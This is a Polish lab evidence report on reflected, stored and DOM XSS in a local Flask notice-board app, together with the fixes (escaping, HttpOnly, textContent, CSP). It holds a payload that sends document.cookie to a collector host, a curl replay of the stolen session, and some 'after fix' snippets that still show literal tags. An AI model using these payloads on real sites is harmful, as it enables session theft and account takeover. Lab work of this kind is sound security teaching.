# Dowody - Laboratorium 6 (XSS)

Wyniki uzyskane lokalnie na dostarczonej aplikacji „Tablica ogłoszeń" (Flask 3.1.3).
Aplikacja pod `http://127.0.0.1:8080`, zbieracz pod `http://localhost:8081`.
Wartości tokenów sesji skrócono.

## Zadanie 1 - XSS odbity

**Podatność:** `aplikacja/app.py`, wiersz 37 - parametr `q` (zmienna `fraza`) wklejany
do HTML bez kodowania:

```python
html += "<h1>Wyniki wyszukiwania dla: " + fraza + "</h1><ul>"
```

**Adres z ładunkiem** (`/szukaj?q=...`):

```
/szukaj?q=%3Cscript%3Edocument.title%3D%27XSS-odbity%27%3Bdocument.body.style.background%3D%27red%27%3C/script%3E
```

Ładunek czytelnie: `<script>document.title='XSS-odbity';document.body.style.background='red'</script>`

**Fragment HTML przed poprawką** (skrypt wraca dosłownie i wykonuje się w przeglądarce):

```html
<h1>Wyniki wyszukiwania dla: <script>document.title='XSS-odbity';document.body.style.background='red'</script></h1>
```

**Fragment HTML po poprawce** (`escape(fraza)` - znaki zamienione na encje, przeglądarka pokazuje tekst):

```html
<h1>Wyniki wyszukiwania dla: <script>document.title=&#x27;XSS-odbity&#x27;;document.body.style.background=&#x27;red&#x27;</script></h1>
```

**Kontrola - wyszukiwanie zwykłego słowa nadal działa:**

```
$ curl -s "http://127.0.0.1:8080/szukaj?q=konsultacje"
<li>anna: Witajcie na tablicy ogłoszeń! Konsultacje w piątek o 12:00.</li>
```

## Zadanie 2 - XSS zapisany i przejęcie sesji

**Podatności:** `tablica.html` renderuje treść ogłoszenia przez `{{ tresc|safe }}`
(zapisany XSS); `app.py` w. 10 ustawia `SESSION_COOKIE_HTTPONLY = False`
(skrypt może odczytać ciasteczko sesji).

**Ładunek (dodany jako ogłoszenie konta `student`):**

```html
<img src=x onerror="this.src='http://localhost:8081/?c='+encodeURIComponent(document.cookie)">
```

Fragment tablicy przed poprawką (ładunek jako aktywny HTML dzięki `|safe`):

```html
<li><b>student</b>: <img src=x onerror="this.src='http://localhost:8081/?c='+encodeURIComponent(document.cookie)"></li>
```

**Wpis zbieracza przed zmianą** (przeglądarka Anny wysłała jej ciasteczko sesji):

```
ZEBRANO: /?c=session=eyJ1enl0a293...
```

**Wpis zbieracza po zmianie** (HttpOnly - `document.cookie` nie zawiera już sesji):

```
ZEBRANO: /?c=
```

**Krok 3 - użycie skradzionego tokenu bez hasła:**

```
$ curl -i -b "session=eyJ1enl0a293..." http://127.0.0.1:8080/notatka
HTTP/1.1 200 OK
<h1>Notatka użytkownika anna</h1>
<p>Prywatna notatka Anny: kod do szafki w pracowni 4721 (fikcyjny).</p>
```

Zwrócono prywatną notatkę Anny - token okaziciela wystarczył.

**Nagłówek `Set-Cookie` z /logowanie (wartość skrócona):**

```
PRZED:  Set-Cookie: session=eyJ1enl0a293...; Path=/
PO:     Set-Cookie: session=eyJ1enl0a293...; HttpOnly; Path=/
```

## Zadanie 3 - Naprawa i Content Security Policy

**Krok 1** - w `tablica.html` zamieniono `{{ tresc|safe }}` na `{{ tresc }}`.
Zapisane ogłoszenie z Zadania 2 po poprawce renderuje się jako tekst:

```html
<li><b>student</b>: <img src=x onerror=&#34;this.src=&#39;http://localhost:8081/?c=&#39;+encodeURIComponent(document.cookie)&#34;></li>
```

**Krok 2 - DOM XSS.** Adres z ładunkiem w atrybucie zdarzenia:

```
/podglad#<img src=x onerror="document.title='XSS-DOM'">
```

Przed: `podglad.html` zawierał skrypt inline `...innerHTML = decodeURIComponent(location.hash.slice(1));`

- `<img onerror>` wstawiony przez `innerHTML` wykonywał się.
  Po: skrypt przeniesiony do `static/podglad.js`, `innerHTML` zastąpione `textContent`
- ładunek wyświetla się jako zwykły tekst.

**Krok 3 - nagłówek CSP (z `@app.after_request`), obecny w każdej odpowiedzi:**

```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'
```

**Krok 4 - test tekstu dosłownego.** Ogłoszenie:
`Zażółć gęślą jaźń: <b>pogrubienie</b> & "cudzysłów" 'apostrof'` wyświetla się dosłownie:

```html
<li><b>student</b>: Zażółć gęślą jaźń: <b>pogrubienie</b> & &#34;cudzysłów&#34; &#39;apostrof&#39;</li>
```

Znacznik `<b>` nie pogrubia tekstu; wszystkie znaki specjalne zakodowane.
